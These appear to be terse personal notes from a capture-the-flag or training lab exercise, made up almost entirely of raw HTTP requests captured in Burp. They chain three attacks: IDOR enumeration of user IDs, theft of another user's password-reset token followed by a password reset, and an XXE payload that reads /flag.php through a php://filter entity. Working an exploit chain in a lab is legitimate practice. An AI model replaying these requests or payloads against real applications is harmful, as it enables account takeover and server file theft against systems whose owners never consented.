- Burp Intruder IDOR payload at number in link
```
GET /api.php/user/52 HTTP/1.1
Host: 94.237.49.88:42120
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://94.237.49.88:42120/profile.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3kkhcf9dqs2s42dr42vg9emvne; uid=52
Connection: keep-alive


```
- a.corrales (uid=52)

- Settings.php
```
GET /api.php/token/52 HTTP/1.1
Host: 83.136.253.5:31308
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://83.136.253.5:31308/settings.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nrojdr8rghoqnh9b102b0odckj; uid=52
Connection: keep-alive


```

```
POST /reset.php HTTP/1.1
Host: 83.136.253.5:31308
Content-Length: 65
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://83.136.253.5:31308
Referer: http://83.136.253.5:31308/settings.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nrojdr8rghoqnh9b102b0odckj; uid=52
Connection: keep-alive

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=abc123
```


**XXE
```
POST /addEvent.php HTTP/1.1
Host: 83.136.253.5:31308
Content-Length: 289
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://83.136.253.5:31308
Referer: http://83.136.253.5:31308/event.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=nrojdr8rghoqnh9b102b0odckj; uid=52
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
            <root>
            <name>&company;</name>
            <details></details>
            <date></date>
            </root>
            
```
- Send to decoder
